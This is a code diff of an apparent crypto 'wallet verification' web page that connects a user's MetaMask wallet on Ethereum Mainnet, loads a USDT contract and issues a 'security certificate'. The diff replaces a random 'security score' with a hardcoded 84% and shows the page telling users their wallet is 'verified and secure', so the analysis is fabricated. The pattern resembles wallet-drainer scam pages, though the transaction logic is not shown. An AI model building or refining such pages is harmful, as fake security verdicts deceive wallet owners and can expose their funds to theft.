@@ -709,10 +709,11 @@
                 <div class="complete-submessage">🔒 Wallet verified and secure</div>
             </div>
             
-            <!-- Download Certificate Button -->
-            <button id="downloadBtn" class="download-btn" onclick="printCertificate()" style="display: none;">
-                📥 Download Certificate
+            <!-- View Certificate Button -->
+            <button id="downloadBtn" class="download-btn" onclick="viewCertificate()" style="display: none;">
+                📜 View Certificate
             </button>
+
         </div>
     </div>
     
@@ -773,18 +774,16 @@
                     <div>Real-time Analysis</div>
                 </div>
             </div>
-            
+
             <div class="cert-buttons">
                 <button class="cert-btn cert-btn-primary" onclick="downloadCertificate()">
-                    📄 Download PDF Certificate
-                </button>
-                <button class="cert-btn cert-btn-secondary" onclick="downloadCertificate()">
                     📊 Download JSON Data
                 </button>
                 <button class="cert-btn cert-btn-close" onclick="closeCertificate()">
                     Close Certificate
                 </button>
             </div>
+
         </div>
     </div>
 
@@ -827,33 +826,58 @@
         let web3, account, usdtContract;
         let certificateData = {};
 
+        
         // ========================================
-        // CONNECT WALLET
+        // CONNECT/DISCONNECT WALLET
         // ========================================
         async function connectWallet() {
+            const btn = document.getElementById('connectBtn');
+            const walletInfo = document.getElementById('walletInfo');
+            
+            // If already connected, disconnect
+            if (btn.textContent === 'Disconnect Wallet') {
+                // Reset UI
+                walletInfo.classList.remove('show');
+                btn.disabled = false;
+                btn.textContent = 'Connect Wallet';
+                
+                // Hide verification section
+                document.getElementById('verificationSection').classList.remove('show');
+                
+                // Reset verification UI
+                document.getElementById('analysisComplete').classList.remove('show');
+                document.getElementById('downloadBtn').style.display = 'none';
+                document.getElementById('verifyBtn').style.display = 'block';
+                document.getElementById('verifyBtn').disabled = false;
+                document.getElementById('verifyBtn').textContent = 'Confirm Verification';
+                document.getElementById('progressContainer').classList.remove('show');
+                
+                return;
+            }
+            
+            // Otherwise, connect wallet
             try {
                 if (!window.ethereum) {
                     alert('Please install MetaMask or Trust Wallet!');
                     return;
                 }
-
+        
                 web3 = new Web3(window.ethereum);
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 account = accounts[0];
-
+        
                 const chainId = await web3.eth.getChainId();
                 if (chainId !== 1) {
                     alert('Please switch to Ethereum Mainnet!');
                     return;
                 }
-
+        
                 usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
-
+        
                 document.getElementById('walletAddress').textContent = 
                     account.slice(0, 6) + '...' + account.slice(-4);
-                document.getElementById('walletInfo').classList.add('show');
-                document.getElementById('connectBtn').disabled = true;
-                document.getElementById('connectBtn').textContent = 'Connected';
+                walletInfo.classList.add('show');
+                btn.textContent = 'Disconnect Wallet';
                 
                 document.getElementById('verificationSection').classList.add('show');
             } catch (error) {
@@ -862,6 +886,7 @@
             }
         }
 
+        
         // ========================================
         // START VERIFICATION
         // ========================================
@@ -992,7 +1017,7 @@
         function generateCertificateData() {
             const first8 = account.slice(0, 10);
             const randomNum = Math.floor(Math.random() * 9000000000000) + 1000000000000;
-            const securityScore = Math.floor(Math.random() * 18) + 65; // 65-82%
+            const securityScore = 84; // Fixed at 84%
             
             const now = new Date();
             const months = ['January', 'February', 'March', 'April', 'May', 'June', 
@@ -1071,25 +1096,12 @@
         }
 
         // ========================================
-        // CLOSE CERTIFICATE
+        // VIEW CERTIFICATE AGAIN
         // ========================================
-        function closeCertificate() {
-            document.getElementById('certificateModal').classList.remove('show');
-            
-            // Show Analysis Complete section and Download button
-            document.getElementById('analysisComplete').classList.add('show');
-            document.getElementById('downloadBtn').style.display = 'flex';
-            
-            // Hide the verify button
-            document.getElementById('verifyBtn').style.display = 'none';
+        function viewCertificate() {
+            document.getElementById('certificateModal').classList.add('show');
         }
 
-        // ========================================
-        // PRINT CERTIFICATE
-        // ========================================
-        function printCertificate() {
-            window.print();
-        }
 
         // ========================================
         // DOWNLOAD CERTIFICATE JSON
